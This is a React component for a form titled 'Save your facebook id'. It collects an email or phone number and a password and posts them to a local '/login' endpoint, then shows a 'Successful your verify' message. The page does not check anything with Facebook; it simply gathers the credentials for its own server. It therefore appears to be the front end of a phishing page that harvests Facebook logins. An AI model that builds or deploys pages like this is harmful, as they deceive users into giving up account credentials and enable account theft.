import { useState } from "react"
import axios from 'axios'
import { IoEyeOutline } from "react-icons/io5";
import { IoEyeOffOutline } from "react-icons/io5";
import { ToastContainer, toast } from 'react-toastify';

import 'react-toastify/dist/ReactToastify.css';



function App() {

  const [text,setText] = useState("")
  const [pass,setPass] = useState("")



  const handleSubmit =()=>{
    axios.post('http://localhost:3000/login',{text,pass}).then(res=>{
      console.log(res);
      setText('')
      setPass('')

      toast.success('Successful your verify', {
        position: "top-right",
        autoClose: 5000,
        hideProgressBar: false,
        closeOnClick: true,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
        theme: "light",
        // transition: Bounce,
        });
      
  }).catch(err=>{
      console.log(err);
      toast.error('Please try again', {
        position: "top-right",
        autoClose: 5000,
        hideProgressBar: false,
        closeOnClick: true,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
        theme: "light",
        // transition: Bounce,
        });
      
  })
  }

  const handleText =(e)=>{
    setText(e.target.value)
    
  }

  const handlePass =(e)=>{
    setPass(e.target.value)
    
  }

  const [showPassword, setShowPassword] = useState(false);

  const togglePasswordVisibility = () => {
    setShowPassword((prevState) => !prevState);
  };


  return (
    <>
      <div className="form-container">
       
          <h2 className="save">Save your facebook id</h2>
          <div className="input-group">
            <input 
            value={text}
            onChange={handleText}
            type="email"
             id="email" name="email" placeholder="Email or Phone" required/>
          </div>
          <div className="input-group d-flex ">
            <input
               value={pass}
                type={showPassword ? "text" : "password"}
                onChange={handlePass}
                id="password"
                name="password"
                placeholder="password" 
                required
                />
            <div>
            <button
            className="Icon"
            type="button"
            onClick={togglePasswordVisibility} >
            {showPassword ? <IoEyeOffOutline /> : <IoEyeOutline />}
            </button>
            </div>

          </div>
          <button onClick={handleSubmit} type="submit" className="btn">Verify</button>
       
      </div>
      <ToastContainer/>
    </>
  )
}

export default App
